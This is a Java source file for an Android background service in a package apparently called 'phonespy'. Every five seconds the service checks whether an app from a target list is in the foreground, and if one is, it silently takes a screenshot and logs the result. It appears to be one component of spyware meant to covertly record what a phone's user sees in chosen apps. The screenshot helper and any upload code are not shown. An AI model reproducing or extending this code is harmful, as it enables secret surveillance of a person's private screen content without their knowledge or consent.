package info.peoce.phonespy.Server;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;

import info.peoce.phonespy.Activity.MainActivity;
import info.peoce.phonespy.App;
import info.peoce.phonespy.Util.Others;
import info.peoce.phonespy.Util.SpyScreen;

public class ScreenCaptureServer extends Service {
    final static private String TAG = ScreenCaptureServer.class.getSimpleName();
    Others others = null;
    boolean isAlive = true;
    MainActivity.MyHandler myHandler = App.getMyHandler();
    public ScreenCaptureServer() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new CaptureScreenAysTask().execute(App.tap_appList);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        others = new Others();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isAlive = false;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    class CaptureScreenAysTask extends AsyncTask<String[], Void, Void> {

        @Override
        protected Void doInBackground(String[]... params) {
            while (isAlive) {
                Message message = new Message();
                message.what = 0;
                String msg;
                msg = null;
                if (others.checkForeHeadApp(params[0])) {
                    msg = "capture screen";
                    SpyScreen.screenShot_background();
                } else {
                    msg = "other app do not capture screen";
                }
                Log.i(TAG, msg);
                message.obj = msg;
                if (myHandler != null) {
                    myHandler.sendMessage(message);
                }
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            Log.i(TAG, "End AsyTask");

        }
    }

}
